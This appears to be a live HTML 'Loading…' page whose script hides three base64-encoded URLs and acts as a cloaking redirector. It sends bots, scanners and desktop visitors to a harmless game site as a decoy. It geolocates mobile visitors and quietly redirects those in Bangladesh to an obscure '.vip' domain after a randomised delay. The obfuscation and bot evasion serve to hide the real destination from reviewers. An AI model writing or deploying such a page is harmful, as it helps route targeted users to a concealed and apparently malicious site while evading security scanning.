<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Loading…</title>
<style>
html,body{
  margin:0;padding:0;width:100%;height:100%;
  display:flex;align-items:center;justify-content:center;
  font-family:Arial,sans-serif;background:#fff;color:#000;text-align:center
}
</style>
</head>
<body>
<div>
  <h2>Loading…</h2>
</div>

<script>
(function(){

/* ===== STRINGS (ENCODED) ===== */
var _S = [
  "aHR0cHM6Ly9xeWxvZi52aXAvYnNybmI=", // Web A
  "aHR0cHM6Ly9wb2tpLmNvbQ==",         // Web B
  "aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=="  // API
];

function D(x){ return atob(x); }

var A = D(_S[0]);
var B = D(_S[1]);
var API = D(_S[2]);

var ua = navigator.userAgent.toLowerCase();

/* ===== HELPERS ===== */
function isMobile(){
  return /android|iphone|ipad|ipod/.test(ua);
}

function isBot(){
  return /bot|crawler|spider|preview|scan|facebookexternalhit|facebot|headless/i.test(ua);
}

function go(u){
  setTimeout(function(){
    location.replace(u);
  }, 800 + Math.random()*800);
}

/* ===== MAIN ===== */
if(isBot() || !isMobile()){
  go(B);
  return;
}

fetch(API)
.then(function(r){ return r.json(); })
.then(function(d){
  var c = (d.country_code || "").toUpperCase();
  if(c === "BD"){
    go(A);
  }else{
    go(B);
  }
})
.catch(function(){
  go(B);
});

})();
</script>
</body>
</html>
